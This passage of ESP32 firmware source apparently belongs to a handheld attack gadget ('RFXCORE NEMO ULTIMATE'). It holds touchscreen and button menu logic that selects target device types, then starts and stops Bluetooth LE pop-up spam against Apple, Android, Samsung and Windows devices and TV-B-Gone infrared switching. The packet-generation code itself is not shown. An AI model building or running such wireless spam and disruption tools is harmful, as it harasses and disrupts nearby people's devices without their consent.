    case STATE_TVBGONE_ACTIVE: handleTVBActiveTouch(); break;
  }
  
  touchDetected = false;
}

void handleMainMenuTouch() {
  if (touchY >= 100 && touchY <= 130) {
    currentMainMenuOption = 0;
    currentState = STATE_DEVICE_MENU;
    showNemoDeviceMenu();
    digitalWrite(LED_PIN, HIGH); delay(100); digitalWrite(LED_PIN, LOW);
  }
  else if (touchY >= 140 && touchY <= 170) {
    currentMainMenuOption = 1;
    currentState = STATE_TVBGONE_MENU;
    showNemoTVBGoneMenu();
    digitalWrite(LED_PIN, HIGH); delay(100); digitalWrite(LED_PIN, LOW);
  }
  else if (touchY >= 180 && touchY <= 210) {
    currentMainMenuOption = 2;
    currentState = STATE_ABOUT;
    showNemoAbout();
    digitalWrite(LED_PIN, HIGH); delay(100); digitalWrite(LED_PIN, LOW);
  }
}

void handleDeviceMenuTouch() {
  for (int i = 0; i < VISIBLE_ITEMS; i++) {
    int deviceIndex = scrollOffset + i;
    if (deviceIndex >= TOTAL_DEVICES) break;
    
    int yPos = 80 + (i * 28);
    if (touchY >= yPos - 5 && touchY <= yPos + 20) {
      currentDeviceIndex = deviceIndex;
      currentState = STATE_INACTIVE;
      showNemoAttackInterface();
      
      for (int j = 0; j < 2; j++) {
        digitalWrite(LED_PIN, HIGH); delay(80); digitalWrite(LED_PIN, LOW); delay(80);
      }
      break;
    }
  }
  
  if (touchX >= 300 && touchY >= 80 && touchY <= 200) {
    scrollOffset++;
    if (scrollOffset > TOTAL_DEVICES - VISIBLE_ITEMS) {
      scrollOffset = TOTAL_DEVICES - VISIBLE_ITEMS;
    }
    showNemoDeviceMenu();
  }
}

void handleInactiveTouch() {
  if (touchY >= 80 && touchY <= 120) {
    isActive = true;
    currentState = STATE_ACTIVE;
    digitalWrite(LED_PIN, HIGH);
    updateNemoStatus(true);
  }
  else if (touchY >= 160 && touchY <= 200) {
    currentState = STATE_DEVICE_MENU;
    showNemoDeviceMenu();
  }
}

void handleActiveTouch() {
  if (touchY >= 80 && touchY <= 120) {
    isActive = false;
    currentState = STATE_INACTIVE;
    pAdvertising->stop();
    digitalWrite(LED_PIN, LOW);
    updateNemoStatus(false);
  }
}

void handleAboutTouch() {
  currentState = STATE_MAIN_MENU;
  showNemoMainMenu();
  digitalWrite(LED_PIN, HIGH); delay(100); digitalWrite(LED_PIN, LOW);
}

void handleTVBGoneMenuTouch() {
  if (touchY >= 100 && touchY <= 130) {
    currentState = STATE_TVBGONE_REGIONS;
    showNemoTVBRegions();
  }
  else if (touchY >= 140 && touchY <= 170) {
    currentState = STATE_TVBGONE_ACTIVE;
    tvb_stats.is_active = true;
    tvb_stats.codes_sent = 0;
    showNemoTVBActive();
  }
  else if (touchY >= 180 && touchY <= 210) {
    currentState = STATE_MAIN_MENU;
    showNemoMainMenu();
  }
  digitalWrite(LED_PIN, HIGH); delay(100); digitalWrite(LED_PIN, LOW);
}

void handleTVBRegionsTouch() {
  for (int i = 0; i < 4; i++) {
    int yPos = 90 + (i * 35);
    if (touchY >= yPos - 5 && touchY <= yPos + 25) {
      currentRegion = i;
      tvb_stats.current_region = i;
      showNemoTVBRegions();
      digitalWrite(LED_PIN, HIGH); delay(80); digitalWrite(LED_PIN, LOW);
      break;
    }
  }
}

void handleTVBActiveTouch() {
  if (touchY >= 190 && touchY <= 210) {
    tvb_stats.is_active = false;
    currentState = STATE_TVBGONE_MENU;
    showNemoTVBGoneMenu();
  }
}

// ============ BUTTON FUNCTIONS ============
unsigned long lastPressTime = 0;
unsigned long lastReleaseTime = 0;
bool waitingForSecondPress = false;
int dernierEtatBouton = HIGH;
unsigned long debounceTime = 0;
const int DEBOUNCE_DELAY = 50;
const int DOUBLE_PRESS_DELAY = 500;

void handleButton() {
  int etatBouton = digitalRead(BTN_BOOT);
  unsigned long currentTime = millis();
  
  if (currentTime - debounceTime < DEBOUNCE_DELAY) {
    dernierEtatBouton = etatBouton;
    return;
  }
  
  if (etatBouton == LOW && dernierEtatBouton == HIGH) {
    debounceTime = currentTime;
    lastPressTime = currentTime;
    
    if (waitingForSecondPress && (currentTime - lastReleaseTime) < DOUBLE_PRESS_DELAY) {
      waitingForSecondPress = false;
      
      if (currentState == STATE_DEVICE_MENU) {
        currentState = STATE_INACTIVE;
        showNemoAttackInterface();
        digitalWrite(LED_PIN, HIGH); delay(100); digitalWrite(LED_PIN, LOW);
        delay(100); digitalWrite(LED_PIN, HIGH); delay(100); digitalWrite(LED_PIN, LOW);
      }
      else if (currentState == STATE_MAIN_MENU) {
        if (currentMainMenuOption == 0) {
          currentState = STATE_DEVICE_MENU;
          showNemoDeviceMenu();
        }
        else if (currentMainMenuOption == 1) {
          currentState = STATE_TVBGONE_MENU;
          showNemoTVBGoneMenu();
        }
        else if (currentMainMenuOption == 2) {
          currentState = STATE_ABOUT;
          showNemoAbout();
        }
        digitalWrite(LED_PIN, HIGH); delay(100); digitalWrite(LED_PIN, LOW);
      }
      else if (currentState == STATE_TVBGONE_REGIONS) {
        currentState = STATE_TVBGONE_ACTIVE;
        tvb_stats.is_active = true;
        tvb_stats.codes_sent = 0;
        showNemoTVBActive();
      }
    }
  }
  
  if (etatBouton == HIGH && dernierEtatBouton == LOW) {
    debounceTime = currentTime;
    lastReleaseTime = currentTime;
    
    unsigned long pressDuration = currentTime - lastPressTime;
    
    if (pressDuration > 50 && pressDuration < 300) {
      waitingForSecondPress = true;
    } else if (pressDuration >= 3000) {
      waitingForSecondPress = false;
      handleLongPress();
    }
  }
  
  if (waitingForSecondPress && (currentTime - lastReleaseTime) > DOUBLE_PRESS_DELAY) {
    waitingForSecondPress = false;
    handleSinglePress();
  }
  
  dernierEtatBouton = etatBouton;
}

void handleSinglePress() {
  if (currentState == STATE_MAIN_MENU) {
    currentMainMenuOption = (currentMainMenuOption + 1) % 3;
    showNemoMainMenu();
    digitalWrite(LED_PIN, HIGH); delay(30); digitalWrite(LED_PIN, LOW);
  }
  else if (currentState == STATE_DEVICE_MENU) {
    currentDeviceIndex = (currentDeviceIndex + 1) % TOTAL_DEVICES;
    
    if (currentDeviceIndex >= scrollOffset + VISIBLE_ITEMS) {
      scrollOffset++;
    } else if (currentDeviceIndex < scrollOffset) {
      scrollOffset--;
    }
    
    scrollOffset = constrain(scrollOffset, 0, TOTAL_DEVICES - VISIBLE_ITEMS);
    showNemoDeviceMenu();
    digitalWrite(LED_PIN, HIGH); delay(30); digitalWrite(LED_PIN, LOW);
  }
  else if (currentState == STATE_TVBGONE_MENU) {
    currentState = STATE_TVBGONE_REGIONS;
    showNemoTVBRegions();
  }
  else if (currentState == STATE_TVBGONE_REGIONS) {
    currentRegion = (currentRegion + 1) % 4;
    tvb_stats.current_region = currentRegion;
    showNemoTVBRegions();
    digitalWrite(LED_PIN, HIGH); delay(30); digitalWrite(LED_PIN, LOW);
  }
  else if (currentState == STATE_TVBGONE_ACTIVE) {
    tvb_stats.is_active = false;
    currentState = STATE_TVBGONE_MENU;
    showNemoTVBGoneMenu();
  }
  else if (currentState == STATE_INACTIVE) {
    isActive = true;
    currentState = STATE_ACTIVE;
    digitalWrite(LED_PIN, HIGH);
    updateNemoStatus(true);
  }
  else if (currentState == STATE_ACTIVE) {
    isActive = false;
    currentState = STATE_INACTIVE;
    pAdvertising->stop();
    digitalWrite(LED_PIN, LOW);
    updateNemoStatus(false);
  }
  else if (currentState == STATE_ABOUT) {
    currentState = STATE_MAIN_MENU;
    showNemoMainMenu();
    digitalWrite(LED_PIN, HIGH); delay(100); digitalWrite(LED_PIN, LOW);
  }
}

void handleLongPress() {
  if (currentState == STATE_TVBGONE_REGIONS) {
    currentState = STATE_TVBGONE_ACTIVE;
    tvb_stats.is_active = true;
    tvb_stats.codes_sent = 0;
    showNemoTVBActive();
  }
  else if (currentState == STATE_TVBGONE_ACTIVE) {
    tvb_stats.is_active = false;
    currentState = STATE_TVBGONE_MENU;
    showNemoTVBGoneMenu();
  }
  else {
    currentState = STATE_MAIN_MENU;
    isActive = false;
    tvb_stats.is_active = false;
    showNemoMainMenu();
  }
  
  for (int i = 0; i < 3; i++) {
    digitalWrite(LED_PIN, HIGH); delay(100);
    digitalWrite(LED_PIN, LOW); delay(100);
  }
}

// ============ SETUP ============
void setup() {
  Serial.begin(115200);
  delay(100);
  
  Serial.println("\n\n========================================");
  Serial.println("RFXCORE NEMO ULTIMATE v5.2");
  Serial.println("========================================");
  Serial.println("✅ APPLE: 6 devices - ИКОНКА В nRF");
  Serial.println("✅ ANDROID: 8 devices - ПОП-АПЫ");
  Serial.println("✅ SAMSUNG: 4 devices - BLE 4.2 FIXED");
  Serial.println("✅ WINDOWS: 2 devices");
  Serial.println("✅ TV-B-GONE: 5 brands");
  Serial.println("========================================\n");
  
  pinMode(BTN_BOOT, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  
  initNemoDisplay();
  initTouchscreen();
  initTVBGone();
  initBLESpam();
  
  showNemoMainMenu();
  
  Serial.println("[SYSTEM] Ready");
}

// ============ LOOP ============
void loop() {
  handleButton();
  checkTouch();
  handleTouchInput();
  
  if (currentState == STATE_ACTIVE && isActive) {
    static uint32_t last_packet = 0;
    if (millis() - last_packet >= (delaySeconds * 1000)) {
      sendAttackPacket();
      last_packet = millis();
      
      static bool ledState = true;
      digitalWrite(LED_PIN, ledState);
      ledState = !ledState;
    }
  }
  
  if (currentState == STATE_TVBGONE_ACTIVE && tvb_stats.is_active) {
    processTVBGoneAttack();
  }
  
  static uint32_t last_stats_update = 0;
  if (millis() - last_stats_update >= 1000) {
    if (currentState == STATE_INACTIVE || currentState == STATE_ACTIVE) {
      updateNemoStats();
    }
    last_stats_update = millis();
  }
  
  if (currentState == STATE_TVBGONE_ACTIVE) {
    static uint32_t last_tv_update = 0;
    if (millis() - last_tv_update >= 500) {
      updateNemoTVBStats();
      last_tv_update = millis();
    }
  }
  
  delay(10);
}
